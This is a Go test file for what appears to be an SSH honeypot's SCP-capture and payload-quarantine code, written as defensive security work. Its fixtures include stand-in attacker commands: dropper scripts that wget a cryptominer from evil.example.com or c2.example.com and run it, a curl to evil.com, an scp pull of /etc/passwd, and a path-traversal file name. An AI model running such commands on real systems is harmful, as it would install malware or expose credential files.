package session

import (
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// fakeChan implements ssh.Channel backed by in-memory buffers.
type fakeChan struct {
	r    io.Reader    // data the handler reads (attacker -> server)
	buf  bytes.Buffer // data the handler writes (server -> attacker)
	exit uint32
}

func (f *fakeChan) Read(p []byte) (int, error)  { return f.r.Read(p) }
func (f *fakeChan) Write(p []byte) (int, error) { return f.buf.Write(p) }
func (f *fakeChan) Close() error                { return nil }
func (f *fakeChan) CloseWrite() error           { return nil }
func (f *fakeChan) SendRequest(name string, _ bool, payload []byte) (bool, error) {
	if name == "exit-status" && len(payload) == 4 {
		f.exit = binary.BigEndian.Uint32(payload)
	}
	return true, nil
}
func (f *fakeChan) Stderr() io.ReadWriter { return io.Discard.(io.ReadWriter) }

// --- isSCPReceive ---

func TestIsSCPReceive(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
	}{
		{"scp -t /lib/abc/", true},
		{"scp -t -r /lib/abc/", true},
		{"scp -r -t /lib/abc/", true},
		{"scp root@host:/file .", false},
		{"scp -r root@host:/path/ .", false},
		{"curl http://evil.com/payload", false},
		{"", false},
		{"scp", false},
	}
	for _, c := range cases {
		got := isSCPReceive(c.cmd)
		if got != c.want {
			t.Errorf("isSCPReceive(%q): want %v got %v", c.cmd, c.want, got)
		}
	}
}

// --- shell path (scpCmd.Run) ---

func TestSCPShellReceiveExitsZero(t *testing.T) {
	// -t flag present -- bot typed scp -t in the shell, we exit 0 so it continues
	_, exit := dispatch("scp -t -r /lib/xlxeavrjsw/")
	if exit != 0 {
		t.Errorf("scp -t in shell: want exit 0, got %d", exit)
	}
}

func TestSCPShellNoFlagFails(t *testing.T) {
	// normal scp (outbound copy) -- should still fail with network error
	out, exit := dispatch("scp root@10.0.0.1:/etc/passwd .")
	if exit == 0 {
		t.Error("scp outbound: want non-zero exit")
	}
	if !strings.Contains(out, "unreachable") {
		t.Errorf("scp outbound: want 'unreachable' in output, got %q", out)
	}
}

// --- exec path (runSCPReceive) ---

func TestSCPReceiveSingleFile(t *testing.T) {
	content := "#!/bin/sh\nwget http://evil.example.com/miner && chmod +x miner && ./miner\n"
	header := fmt.Sprintf("C0755 %d payload.sh\n", len(content))
	// attacker sends: file header + file data + trailing null
	attackerData := header + content + "\x00"

	fc := &fakeChan{r: strings.NewReader(attackerData), buf: bytes.Buffer{}}
	var logBuf bytes.Buffer
	log := slog.New(slog.NewTextHandler(&logBuf, &slog.HandlerOptions{Level: slog.LevelDebug}))

	runSCPReceive(fc, "scp -t -r /lib/abc/", log, "", newSession())

	if fc.exit != 0 {
		t.Errorf("want exit 0, got %d", fc.exit)
	}
	logs := logBuf.String()
	if !strings.Contains(logs, "payload.sh") {
		t.Errorf("want filename in log, got: %s", logs)
	}
	// server must have written at least 3 ready/ack bytes:
	// \x00 initial + \x00 ack header + \x00 ack file
	if fc.buf.Len() < 3 {
		t.Errorf("want >= 3 ack bytes written, got %d", fc.buf.Len())
	}
	// all ack bytes must be 0x00
	for i, b := range fc.buf.Bytes() {
		if b != 0x00 {
			t.Errorf("ack byte %d: want 0x00, got 0x%02x", i, b)
		}
	}
}

func TestSCPReceiveDirectory(t *testing.T) {
	// directory header + file inside + end-of-dir
	fileContent := "echo hi\n"
	attackerData := "D0755 0 mydir\n" +
		fmt.Sprintf("C0644 %d run.sh\n", len(fileContent)) +
		fileContent + "\x00" +
		"E\n"

	fc := &fakeChan{r: strings.NewReader(attackerData), buf: bytes.Buffer{}}
	var logBuf bytes.Buffer
	log := slog.New(slog.NewTextHandler(&logBuf, nil))

	runSCPReceive(fc, "scp -t -r /tmp/drop/", log, "", newSession())

	if fc.exit != 0 {
		t.Errorf("want exit 0, got %d", fc.exit)
	}
	logs := logBuf.String()
	if !strings.Contains(logs, "run.sh") {
		t.Errorf("want run.sh in log, got: %s", logs)
	}
	if !strings.Contains(logs, "end_dir") {
		t.Errorf("want end_dir in log, got: %s", logs)
	}
}

// --- savePayload / quarantine ---

func TestSavePayloadWritesFile(t *testing.T) {
	dir := t.TempDir()
	content := []byte("#!/bin/sh\nwget http://c2.example.com/xmrig && ./xmrig\n")
	log := slog.New(slog.NewTextHandler(io.Discard, nil))

	n := savePayload(dir, "dropper.sh", int64(len(content)), bytes.NewReader(content), log)
	if n != int64(len(content)) {
		t.Errorf("savePayload returned %d bytes, want %d", n, len(content))
	}

	// find the file -- name is <sha256>-dropper.sh.bin
	h := sha256.Sum256(content)
	want := hex.EncodeToString(h[:]) + "-dropper.sh.bin"
	if _, err := os.Stat(filepath.Join(dir, want)); err != nil {
		t.Errorf("quarantine file %q not found: %v", want, err)
	}
}

func TestSavePayloadSanitizesName(t *testing.T) {
	// attacker sends "../../etc/passwd" -- filepath.Base must strip the traversal
	dir := t.TempDir()
	content := []byte("evil")
	log := slog.New(slog.NewTextHandler(io.Discard, nil))

	savePayload(dir, "../../etc/passwd", int64(len(content)), bytes.NewReader(content), log)

	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		if strings.Contains(e.Name(), "/") || strings.Contains(e.Name(), "..") {
			t.Errorf("filename contains path component: %q", e.Name())
		}
	}
	// file must land inside dir, not escape it
	if _, err := os.Stat("/tmp/passwd"); err == nil {
		t.Error("file escaped quarantine dir")
	}
}

func TestSavePayloadDeduplicates(t *testing.T) {
	dir := t.TempDir()
	content := []byte("same content")
	log := slog.New(slog.NewTextHandler(io.Discard, nil))

	savePayload(dir, "a.bin", int64(len(content)), bytes.NewReader(content), log)
	savePayload(dir, "a.bin", int64(len(content)), bytes.NewReader(content), log)

	entries, _ := os.ReadDir(dir)
	// tmp files must be gone, final file count is 1
	var finals []string
	for _, e := range entries {
		if !strings.HasSuffix(e.Name(), ".tmp") {
			finals = append(finals, e.Name())
		}
	}
	if len(finals) != 1 {
		t.Errorf("want 1 quarantine file, got %d: %v", len(finals), finals)
	}
}

func TestSCPReceiveQuarantines(t *testing.T) {
	// full runSCPReceive with a real quarantine dir -- file must land on disk
	dir := t.TempDir()
	content := "#!/bin/sh\necho owned\n"
	header := fmt.Sprintf("C0755 %d miner\n", len(content))
	attackerData := header + content + "\x00"

	fc := &fakeChan{r: strings.NewReader(attackerData), buf: bytes.Buffer{}}
	log := slog.New(slog.NewTextHandler(io.Discard, nil))

	runSCPReceive(fc, "scp -t /tmp/x/", log, dir, newSession())

	if fc.exit != 0 {
		t.Errorf("want exit 0, got %d", fc.exit)
	}
	entries, _ := os.ReadDir(dir)
	if len(entries) != 1 {
		t.Errorf("want 1 file in quarantine, got %d", len(entries))
	}
}

func TestSCPReceiveEmptyStream(t *testing.T) {
	// attacker connects but sends nothing -- timeout path isn't hit (EOF comes first)
	fc := &fakeChan{r: strings.NewReader(""), buf: bytes.Buffer{}}
	log := slog.New(slog.NewTextHandler(io.Discard, nil))

	runSCPReceive(fc, "scp -t /lib/empty/", log, "", newSession())

	if fc.exit != 0 {
		t.Errorf("want exit 0 even on empty stream, got %d", fc.exit)
	}
}
